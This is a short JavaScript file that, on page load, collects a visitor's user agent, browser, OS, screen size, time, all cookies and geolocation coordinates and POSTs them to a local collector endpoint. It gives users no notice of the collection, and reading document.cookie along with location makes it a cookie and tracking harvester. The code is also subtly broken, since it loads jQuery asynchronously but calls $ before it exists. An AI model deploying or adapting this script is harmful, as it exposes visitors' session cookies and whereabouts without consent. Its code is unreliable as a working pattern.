// Include jQuery from CDN
var script = document.createElement('script');
script.src = 'https://code.jquery.com/jquery-3.6.4.min.js';
document.head.appendChild(script);


// Function to collect browser data
function collectBrowserData() {
    getLocation(function (geolocationResult) {
        // Get other browser data here

        var browserData = {
            userAgent: navigator.userAgent,
            browserName: getBrowserName(),
            browserType: getBrowserType(),
            browserVersion: getBrowserVersion(),
            cookies: getCookies(),
            location: geolocationResult,
            currentTime: getCurrentTime(),
            screenSize: getScreenSize(),
            operatingSystem: getOperatingSystem(),
            // Add more properties as needed
        };


        // Send data to the server using AJAX
        $.ajax({
            url: 'http://127.0.0.1:5000/collect_browser_data',
            method: 'POST',
            contentType: 'application/json',
            data: JSON.stringify(browserData),
            success: function (response) {
                console.log('Data sent successfully:', response);
            },
            error: function (xhr, status, error) {
                console.error('Error sending data:', status, error);
            }
        });
    });
}

// Function to get browser name
function getBrowserName() {
    var agent = navigator.userAgent.toLowerCase();
    if (agent.indexOf("chrome") !== -1) return "Chrome";
    if (agent.indexOf("firefox") !== -1) return "Firefox";
    if (agent.indexOf("safari") !== -1) return "Safari";
    if (agent.indexOf("edge") !== -1) return "Edge";
    if (agent.indexOf("opera") !== -1 || agent.indexOf("opr") !== -1) return "Opera";
    if (agent.indexOf("msie") !== -1 || agent.indexOf("trident") !== -1) return "Internet Explorer";
    return "Unknown";
}

// Function to get browser type
function getBrowserType() {
    return navigator.product;
}

// Function to get browser version
function getBrowserVersion() {
    var match = navigator.userAgent.match(/(chrome|firefox|safari|edge|opr|msie|trident(?=\/))\/?\s*(\d+)/i);
    return match ? parseInt(match[2]) : "Unknown";
}

// Function to get all cookies
function getCookies() {
    return document.cookie;
}


// Function to get user's location
function getLocation(callback) {
    if (navigator.geolocation) {
        // Geolocation is supported
        navigator.geolocation.getCurrentPosition(
            function (position) {
                // Retrieve latitude and longitude
                var latitude = position.coords.latitude;
                var longitude = position.coords.longitude;

                // Call the callback with geolocation information
                callback("Latitude: " + latitude + ", Longitude: " + longitude);
            },
            function (error) {
                // Handle geolocation error
                callback("Geolocation error: " + error.message);
            }
        );
    } else {
        // Geolocation is not supported
        callback("Geolocation not supported");
    }
}



// Function to get current time
function getCurrentTime() {
    return new Date().toISOString();
}

// Function to get screen size
function getScreenSize() {
    return {
        width: screen.width,
        height: screen.height,
    };
}

// Function to get operating system
function getOperatingSystem() {
    var platform = navigator.platform.toLowerCase();

    if (platform.indexOf('win') !== -1) return 'Windows';
    if (platform.indexOf('mac') !== -1) return 'Mac';
    if (platform.indexOf('linux') !== -1) return 'Linux';

    return 'Unknown';
}

// Call the function on page load
$(document).ready(function () {
    collectBrowserData();
});
